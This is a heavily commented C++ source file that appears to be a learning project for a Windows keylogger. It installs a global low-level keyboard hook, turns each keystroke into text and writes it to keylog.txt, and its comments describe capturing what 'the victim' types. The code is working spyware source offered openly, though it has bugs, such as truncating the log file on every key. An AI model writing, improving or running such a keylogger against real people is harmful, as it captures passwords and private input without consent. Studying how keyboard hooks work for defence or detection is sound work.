#include <iostream>
#include <fstream>
#include <Windows.h>

using namespace std;

// Problems to be fixed: Lambda function to show when caps are on and off, Make lowercase letters show


// Function that takes an integer "key" and logs it into a file; responsible for converting the raw vkCode into readable form
void logKeyStrokes(int key){


    ofstream myFile; // File we are writing to

    myFile.open("keylog.txt", ios::trunc);
    myFile.close();

    myFile.open("keylog.txt", ios::app); // Opens the text file we want to add the information to, and the mode we set it is append so it adds the information after words.


    // Logs all the function keys; the reason we are doing this is because if we don't explicilty log/write the function keys it will display some random integer that we don't know.
    // For example, if we took out the enter conditional, when we press enter it would only output the number "13" to the file and we don't know which key that is.
    // Also the virtual key code (which are basically enums) ("VK_BACK", etc.) values are in hexa-decimal form 
    if (key == VK_BACK ){
        myFile << "[BACKSPACE]";
    }
    else if (key == VK_RETURN)
    {
        myFile << "[ENTER]"; 
    }
    else if (key == VK_SPACE){
        myFile << " ";
    }
    else if (key == VK_TAB){
        myFile << "[TAB]";
    }
    else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT){
        myFile << "[SHIFT]";
    }
    else if( key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL){
        myFile << "[CONTROL]";
    }
    else if (key == VK_ESCAPE){
        myFile << "[ESCAPE]";
    }
    else if (key == VK_OEM_PERIOD){
        myFile << ".";
    }
    else if( key == VK_CAPITAL){
        myFile << "[CAPS]";
    }
    // Logs alphabetic keys (A-Z) and #'s (0-9) as the character

    // Checks if the integer value of the key corresponds and is in the threshold of the uppercase letters in the ASCII table
    else if (key >= 'A' && key <= 'Z'){
        myFile << char(key); // Logs the uppercase letter pressed by type converting its ASCII/ vkCode value into that character
    }
    else if(key >= 'a' && key <= 'z'){
        myFile << char(tolower(key));
    }
    // Checks if the integer value of the key corresponds and is in the threshold of the numbers 0-9 in the ASCII table
    else if( key >= '0' && key <= '9'){
        myFile << char(key); // Logs the number pressed
    }
    else{
        myFile << "[" << key << "]"; // Logs other keys using their virtual keycode value

    }

    myFile.close();
    
    

}

/*
Key terms we need to know:

Hook: A hook is a mechanism by which an application can intercept events, such as messages, mouse actions, and keystrokes (aka listen in on events happening in windows).
Hook Procedure: A function that intercepts a particular type of event
Hook Chain: A hook chain is a series of application-defined callback functions (hook procedures) registered for the same event type (EX. WH_KEYBOARD_LL) using pointers.
            So what this means is that there is multiple hook procedures within the hook we decided to use 
            and it is called a hook chain. We cannot see these processes but they are being handled by windows
            They are processed by CallNextHookEx which passes the event to the next hook until it reach's the systems default handler
Callback function: A callback function is a function that you pass as an argument to another function/program so it can be activated/executed when a certain event or condition occurs

*/


// Our hook procedure: The function/callback function windows calls everytime our specified event occurs (in this case when a key is pressed )
// This is what is happening when our keyboard strokes is being pressed
LRESULT CALLBACK KeyboardProc (int nCode, WPARAM wPARAM, LPARAM lParam){
    /*
    What is nCode? 
        * nCode is an integer provided by Windows that tells your function whether it should process the event.
        - According to windows documentation, if nCode is less than 0, it signals something isnt right or this event is not meant for your hook
        - If this were to happen our callback function should not process the event and pass it along by calling CallNextHookEx
        - nCode is basically our "permission flag"
    */

    /*
    What is wParam?
        * wParam is a parameter that indicates what type of keyboard message. It tells you whether it was pressed down, released, or something else
        - WParam basically identifies whether the key was pressed or released
    */

   /*
   What is lParam? 
        * lParam is a pointer to a structure that contains detailed info about the keyboard event
        - For low level keyboard hooks, lParam points to a KBDLLHOOKSTRUCT which allows us to use the virtual keycode
        - By casting (converting) lParam (the pointer to the key information) to KBDLLHOOKSTRUCT, we can use the vkCode (virtual key codes) to determine which key was pressed
   */
    

    cout << nCode << " nCode\n";
    cout << wPARAM << " wParam\n";
    cout << lParam << " lParam\n";
    
    // Checks whether or not it should process the event (basically checking if a key was pressed and if a key was pressed down)
    if (nCode >= 0 && wPARAM == WM_KEYDOWN){
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*) lParam; // This converts lParam to a pointer of type KBLLHOOKSTRUCT so we can access detailed info about the key that was pressed
        int key = pKeyBoard->vkCode; // We are assigning detailed information we got from the KBLLHOOKSTRUCT pointer into its virtual keycode
        logKeyStrokes(key); // Logs the key from the pointer
    }

    /*
    When you install a keyboard hook, you're adding your hook procedure to a chain of hook procedures that are registered for keyboard events. 
    When the hook procedure calls CallNextHookEx, it passes the event along to the next hook in that chain.
    These hooks are managed by Windows and may belong to other applications or system processes. You don’t see them in our code, but they’re there in the internal hook chain.
    */
    return CallNextHookEx(NULL, nCode, wPARAM, lParam); 
}

  /*
    So how this works:
    - Our hook procedure (aka callback function) is what happens when we run the code and type in our keys (our event in which we are waiting for)
    - Our Hook (keyBoardHook) which is how we listen and wait for the victim to type something, CALLS KeyboardProc which activates/starts our function (logging the keys)
    - When the victim presses a key, it generates a keyboard event (WM_KEYDOWN) it notifies the callback function and does all of its checks
    - Logs the key into the file first
    - Goes through the hook chains and reaches the windows system messsage queue
    - Once it reaches the windows message queue it translates the vkCode because it is a higher-level compared to the hook into a WM_CHAR so windows can process it
    - Once it is translated it is dispatched so the UI of whatever textbox it is being entered too can be visible to the user

    */


    /*
 * Overview of the Keyboard Hook and Message Loop Process:
 *
 * 1. Hook Installation:
 *    - The application installs a low-level keyboard hook (e.g., WH_KEYBOARD_LL) using SetWindowsHookEx.
 *    - This hook, represented by keyBoardHook, listens for keyboard events (such as key presses) before
 *      Windows processes them normally.
 *
 * 2. KeyboardProc Hook Procedure:
 *    - When a key is pressed, Windows immediately calls the KeyboardProc callback function.
 *    - Inside KeyboardProc:
 *         a. It checks if the event should be processed (nCode >= 0) and if the event is a key press (wParam == WM_KEYDOWN).
 *         b. It casts the lParam pointer to a KBDLLHOOKSTRUCT pointer to access details about the event.
 *         c. It extracts the virtual key code (vkCode) from the structure.
 *         d. It calls logKeyStrokes(vkCode), which converts the vkCode into a human-readable form
 *            (e.g., a character for alphanumerics or a descriptive string for special keys) and logs it to a file.
 *    - After processing the event, CallNextHookEx is called to pass the event to the next hook in the chain.
 *
 * 3. Message Loop Processing:
 *    - The application contains a while loop that continuously processes messages from Windows:
 *         a. GetMessage(&message, NULL, 0, 0) retrieves messages from the message queue, keeping the app alive.
 *         b. TranslateMessage(&message) converts raw key events (like WM_KEYDOWN) into WM_CHAR messages,
 *            considering modifiers (Shift, Caps Lock) to determine the actual character.
 *         c. DispatchMessage(&message) sends these translated messages to the appropriate window procedure,
 *            allowing UI components (such as text boxes) to display the character.
 *
 * 4. Cleanup:
 *    - When the application is closing (e.g., after receiving a WM_QUIT message), UnhookWindowsHookEx is called
 *      to remove the hook, ensuring Windows no longer intercepts keyboard events for this application.
 *
 * Summary:
 * - The low-level hook logs keystrokes immediately by intercepting key events before they reach the message loop.
 * - The hook procedure logs the key (converting the vkCode) and then passes the event along the internal hook chain.
 * - Once the event reaches the Windows message system, the message loop retrieves, translates, and dispatches it,
 *   so normal application processing (like displaying text) occurs.
 */


int main(){


    // To take advantage of a particular type of hook, the developer provides a hook procedure (LRESULT CALLBACK KeyboardProc) and uses the SetWindowsHookEx function to install it into the chain associated with the hook.
    // So in this case we are specifying use of the WH_KEYBOARD_LL hook type
    HHOOK keyBoardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0); // This is what is waiting for our keyboard strokes
    MSG message; // Store info about things such as keystrokes, mouse movements, and other events

    /*
        GetMessage parameters: 
        -lpMsg: Memory address of the MSG structure to where the info will be stored, 
        -HWND: which window we want to retrieve messages from (NULL = All windows)
        - wMsgFilterMin - Message filtering of the lowest message value to be received
        - wMsgFilterMax - Message filtering of the highest message value to be received
    */

    /*
    *GetMessage steps:
        - Create Loop that continues as long as GetMessage returns a non-zero value
        - GetMessage collects incoming messages (system and user messages) with its respective parameters
          Think of GetMessage as a mailroom clerk who waits until a new piece of mail arrives. Only when there's mail does the clerk pick it up and read it.  
        - Translate message then opens up the messages and translates the keycodes into characters because once again since it is operating on a higher-level compared to our hook
        - Dispatch message lets us display the character onto the UI

    */
    
    /*
    -This Getmessage while loop is a separate mechanism that processes system messages such as key pressed, mouse movements, etc. after our hook chain procedures are done until the application is closed; keys pressed in this case
    -The reason we need this is because most GUI applications already have a built-in message loop that processes events message events continuously (Like google or any GUI App)  
     but in our case we have to make one or create our own even though we don't have a GUI application so it could process the information.
    */
   
    while (GetMessage(&message, NULL,0,0)) {

        /*
        - TranslateMessage converts our raw key event (WM_KEYDOWN (vkCode), when we press down on the key) into a WM_CHAR message. 
        - GetMessage operates at a higher-system level so when we press down on they key it only gives us the vkCode
        - The WM_CHAR messsage carries the actual character because Windows only sends out info that a key was pressed, not the actual character it represents and that is what translateMessage does for us
        - The reason we have to do this is because many window procedures are designed to process WM_CHAR messages. (EX. Typing in a text box), without it windows would only see raw keycodes
        */
        
        auto translated = TranslateMessage(&message); 
        cout << translated << " :Translated message" << "\n";
        // Sends the message to the correct window procedures
        auto dispatched = DispatchMessage(&message); 
        cout << dispatched << " :Dispatched message" << "\n";
    }

    UnhookWindowsHookEx(keyBoardHook);
    return 0;
}